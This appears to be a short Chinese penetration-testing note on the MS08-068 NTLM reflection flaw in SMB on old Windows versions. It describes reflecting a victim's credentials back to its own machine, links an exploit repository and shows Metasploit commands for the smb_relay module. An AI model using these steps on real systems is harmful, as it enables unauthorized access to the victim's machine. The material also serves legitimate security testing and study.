	SMB 协议中的 NTLM 反射漏洞仅针对 Windows 2000 到 Windows Server 2008
	此漏洞允许攻击者将传入的 SMB 连接重定向回它来自的计算机，然后使用受害者自己的凭据访问受害者计算机
	https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068
	msf > use exploit/windows/smb/smb_relay
	msf exploit(smb_relay) > show targets